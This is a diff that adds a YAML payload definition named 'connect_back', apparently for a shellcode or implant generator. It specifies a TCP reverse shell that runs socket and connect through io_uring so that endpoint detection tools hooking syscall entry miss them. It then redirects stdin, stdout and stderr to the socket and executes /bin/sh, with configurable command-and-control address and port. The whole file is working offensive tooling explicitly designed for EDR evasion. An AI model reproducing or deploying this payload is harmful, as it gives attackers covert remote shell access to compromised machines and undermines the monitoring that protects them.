@@ -1,0 +1,39 @@
+name: connect_back
+description: >
+  TCP reverse shell via io_uring.
+  socket/connect run through io_uring (invisible to sys_enter EDRs);
+  dup2 and execve are native syscalls (io_uring cannot manipulate the
+  process fd table). After execve the host process is replaced by
+  /bin/sh with stdin/stdout/stderr on the socket.
+requires_kernel: "5.19"
+
+config:
+  c2_ip:   "127.0.0.1"
+  c2_port: 4444
+
+ops:
+  - socket:
+      domain: AF_INET
+      type:   SOCK_STREAM
+      result: sock_fd
+
+  - connect:
+      fd:   sock_fd
+      ip:   "{{ c2_ip }}"
+      port: "{{ c2_port }}"
+
+  # native syscalls — no uring equivalent touches the real fd table
+  - dup2:
+      fd: sock_fd
+      new_fd: 0          # stdin  → socket (xor-encoded, null-free)
+  - dup2:
+      fd: sock_fd
+      new_fd: 1          # stdout → socket
+  - dup2:
+      fd: sock_fd
+      new_fd: 2          # stderr → socket
+
+  # native syscall — replaces the host process; never returns
+  - execve:
+      path: "/bin/sh"
+      argv: ["/bin/sh"]
